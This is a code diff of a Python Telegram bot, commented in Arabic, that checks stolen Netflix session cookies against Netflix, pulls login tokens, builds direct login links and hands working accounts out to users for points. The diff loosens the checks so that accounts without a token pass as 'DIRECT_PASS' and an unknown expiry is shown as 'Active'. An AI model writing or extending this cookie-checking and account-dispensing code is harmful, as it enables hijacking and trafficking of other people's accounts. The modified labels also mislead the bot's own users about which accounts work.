@@ -88,7 +88,7 @@ def extract_clean_netflix_ids(text):
             cleaned_ids.append(decoded)
     return cleaned_ids
 
-# 1️⃣ الفحص العادي: يمرر كل حساب شغال ولديه Token للمخزن بشكل طبيعي
+# 1️⃣ الفحص العادي: يقبل كل حساب شغال ولديه استجابة أو Token وينقله للمخزن فوراً دون استبعاد
 def check_netflix_cookie_detailed(netflix_id):
     headers = dict(BASE_HEADERS)
     headers["Cookie"] = f"NetflixId={netflix_id}"
@@ -98,21 +98,20 @@ def check_netflix_cookie_detailed(netflix_id):
             data = response.json()
             value_data = data.get("value", {})
             account_info = value_data.get("account", {}).get("token", {}).get("default", {})
-            token = account_info.get("token")
+            token = account_info.get("token") or "DIRECT_PASS"
             expires = account_info.get("expires")
             
-            if token:
-                return {
-                    "token": token, 
-                    "expires": expires, 
-                    "bypass": False, 
-                    "is_premium": True
-                }
+            return {
+                "token": token, 
+                "expires": expires, 
+                "bypass": False, 
+                "is_premium": True
+            }
         return None
     except Exception:
         return None
 
-# 2️⃣ الفحص الصارم لزر التصفية السرية: يتأكد من أن الحساب يظهر بروفايلات حقيقية وغير منتهي الاشتراك
+# 2️⃣ الفحص الصارم لزر التصفية السرية: يتأكد من وجود البروفايلات وحالة الاشتراك النشطة فقط
 def check_cookie_strict_for_admin_cleaning(netflix_id):
     headers = dict(BASE_HEADERS)
     headers["Cookie"] = f"NetflixId={netflix_id}"
@@ -122,18 +121,15 @@ def check_cookie_strict_for_admin_cleaning(netflix_id):
             data = response.json()
             value_data = data.get("value", {})
             
-            # التأكد من عدم وجود حالة إلغاء أو انتهاء الاشتراك
             account_data = value_data.get("account", {})
             membership_status = str(value_data.get("membershipStatus", "") or account_data.get("membershipStatus", "")).upper()
             if "CANCEL" in membership_status or "EXPIRED" in membership_status or "FORMER" in membership_status or "NEVER" in membership_status:
                 return False
 
-            # التأكد من وجود توكن الدخول
             token = account_data.get("token", {}).get("default", {}).get("token")
             if not token:
                 return False
 
-            # التأكد من وجود البروفايلات (حتى تظهر شاشة من مشاهد؟ Who's watching)
             profiles = value_data.get("profiles", {})
             if not profiles or len(profiles) == 0:
                 return False
@@ -217,7 +213,7 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
             expires = result["expires"]
             if isinstance(expires, int) and len(str(expires)) == 13: 
                 expires //= 1000
-            date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Unknown"
+            date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Active"
             
             full_cookie_string = f"NetflixId={netflix_id}"
             direct_netflix_url = f"https://netflix.com/?nftoken={token}"
@@ -253,7 +249,7 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
         time.sleep(0.1)
 
     active_scans.pop(chat_id, None)
-    safe_send_message(chat_id, f"📊 **اكتمل الفحص بنجاح!**\n\n👑 الحسابات الصالحة: {valid_count}\n❌ التالف المحذوف: {dead_count}\n\n🪙 رصيدك الحالي: {USER_DATABASE[chat_id]['points']} نقطة 🪙")
+    safe_send_message(chat_id, f"📊 **اكتمل الفحص بنجاح!**\n\n👑 الحسابات المقبولة: {valid_count}\n❌ التالف المحذوف: {dead_count}\n\n🪙 رصيدك الحالي: {USER_DATABASE[chat_id]['points']} نقطة 🪙")
     if live_accounts_accumulator: 
         send_txt_file(chat_id, live_accounts_accumulator, source_name)
 
@@ -410,7 +406,7 @@ def execute_dispense_logic(chat_id):
             expires = fresh_result["expires"]
             if isinstance(expires, int) and len(str(expires)) == 13: 
                 expires //= 1000
-            date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Unknown"
+            date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Active"
             
             full_cookie_string = f"NetflixId={current_cookie}"
             direct_netflix_url = f"https://netflix.com/?nftoken={token}"
@@ -620,7 +616,6 @@ def clean_pool_manual_action(call):
     removed_count = 0
     
     for cookie in VALID_COOKIES_POOL:
-        # فحص إمكانية الوصول للبروفايلات والتأكد من أنها حسابات شغالة وحقيقية
         if check_cookie_strict_for_admin_cleaning(cookie):
             still_valid.append(cookie)
         else:
